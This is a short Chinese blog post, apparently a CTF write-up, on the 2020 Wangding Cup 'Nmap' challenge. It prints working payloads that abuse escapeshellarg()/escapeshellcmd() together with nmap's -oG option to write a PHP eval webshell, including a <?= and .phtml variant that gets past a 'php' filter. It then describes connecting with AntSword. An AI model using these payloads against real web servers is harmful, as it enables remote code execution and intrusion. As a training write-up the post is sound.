---

title: 日常练习22——初识nmap命令

date: 2021-04-24 23:13:03

tags: 练习

categories: test71

---
这道题和之前写的那道onlinetool是一个类型的，都是nmap命令的使用加上escapeshellarg()+escapeshellcmd()的函数漏洞，只不过多了几个小过滤而已。   

# [网鼎杯 2020 朱雀组]Nmap  

题目就已经提示的很明白了，就是考察nmap命令的使用，我们直接用上一道题的payload来写入一句话木马：  

	' <?php eval($_POST["v"]);?> -oG shell.php '  

[![](https://img.imgdb.cn/item/60857235d1a9ae528f37d36d.png)](https://img.imgdb.cn/item/60857235d1a9ae528f37d36d.png)  

发现有东西被过滤了。过滤的是php后缀名，我们使用phtml来绕过后缀，用等号来绕过前面的php字符  

	' <?= eval($_POST["v"]);?> -oG shell.phtml '    

[![](https://img.imgdb.cn/item/608572e9d1a9ae528f3f0d97.png)](https://img.imgdb.cn/item/608572e9d1a9ae528f3f0d97.png)  

这次没有被拦截，我们查看一下是否写入成功文件。  

[![](https://img.imgdb.cn/item/60857333d1a9ae528f420b81.png)](https://img.imgdb.cn/item/60857333d1a9ae528f420b81.png)

确实写入成功，接下来我们就可以使用蚁剑来连接或者直接在页面执行命令语句。  

[![](https://img.imgdb.cn/item/608573dcd1a9ae528f494add.png)](https://img.imgdb.cn/item/608573dcd1a9ae528f494add.png)  

在根目录发现flag。  

# 小结  

这道题目其实就是上一道题目翻版，只不过多了对php的过滤，考察的内容还是一样的，关于nmap命令的使用还是要多加熟悉，不能一眼看到不知道这是什么。
